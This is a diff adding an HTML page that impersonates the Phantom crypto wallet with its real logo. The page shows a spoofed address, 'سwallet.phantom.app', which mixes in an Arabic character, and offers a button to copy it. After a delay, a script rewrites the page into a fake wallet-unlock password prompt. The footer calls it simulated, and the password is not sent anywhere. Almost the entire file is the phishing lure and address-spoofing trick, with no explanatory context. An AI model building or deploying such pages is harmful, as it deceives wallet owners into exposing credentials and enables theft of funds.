@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Phantom Wallet Login</title>
+    <style>
+      body {
+        font-family: Arial, sans-serif;
+        background-color: #f2f2f2;
+        padding: 40px;
+        text-align: center;
+      }
+      .card {
+        background-color: white;
+        max-width: 420px;
+        margin: auto;
+        padding: 30px;
+        border-radius: 12px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+      }
+      .phantom-logo {
+        width: 80px;
+        margin-bottom: 15px;
+      }
+      h2 {
+        color: #333;
+        margin-bottom: 10px;
+      }
+      p {
+        font-size: 15px;
+        color: #666;
+        margin-bottom: 20px;
+      }
+      .url-box {
+        background: #f5f5f5;
+        padding: 12px;
+        border-radius: 6px;
+        font-family: monospace;
+        font-size: 14px;
+        color: #444;
+        word-break: break-word;
+      }
+      button {
+        background-color: #8a63d2;
+        color: white;
+        padding: 10px 20px;
+        border: none;
+        border-radius: 6px;
+        font-size: 14px;
+        cursor: pointer;
+        margin-top: 20px;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <img class="phantom-logo" src="https://mintlify.s3.us-west-1.amazonaws.com/phantom-e50e2e68/resources/images/Phantom_SVG_Icon.svg" alt="Phantom Logo">
+      <h2>Connect with Phantom</h2>
+      <p>Copy and paste the URL below into your browser's address bar:</p>
+      <div class="url-box" id="fakeurl">https://سwallet.phantom.app</div>
+      <button onclick="copyUrl()">📋 Copy URL</button>
+    </div>
+
+    <script>
+      function copyUrl() {
+        const url = document.getElementById("fakeurl");
+        if (!window.getSelection) return;
+        const range = document.createRange();
+        range.selectNodeContents(url);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+        document.execCommand("copy");
+
+        setTimeout(() => {
+          document.write(`
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .login-container {
+      background: white;
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
+      text-align: center;
+      width: 300px;
+    }
+    .phantom-logo {
+      width: 80px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      margin: 10px 0;
+      color: #333;
+    }
+    p {
+      color: #666;
+      margin-bottom: 20px;
+    }
+    input[type="password"] {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 15px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+    button {
+      width: 100%;
+      padding: 10px;
+      background: #8a63d2;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-weight: bold;
+      font-size: 14px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    button:hover {
+      background: #6f4db1;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #999;
+    }
+  </style>
+  <div class="login-container">
+    <img class="phantom-logo" src="https://mintlify.s3.us-west-1.amazonaws.com/phantom-e50e2e68/resources/images/Phantom_SVG_Icon.svg" alt="Phantom Logo">
+    <h2>Phantom Wallet</h2>
+    <p>Unlock your wallet</p>
+    <input type="password" placeholder="Enter your wallet password" />
+    <button type="submit">Unlock</button>
+    <div class="footer">Phantom UI - Simulated</div>
+  </div>
+`);
+        }, 4200);
+      }
+    </script>
+  </body>
+</html>
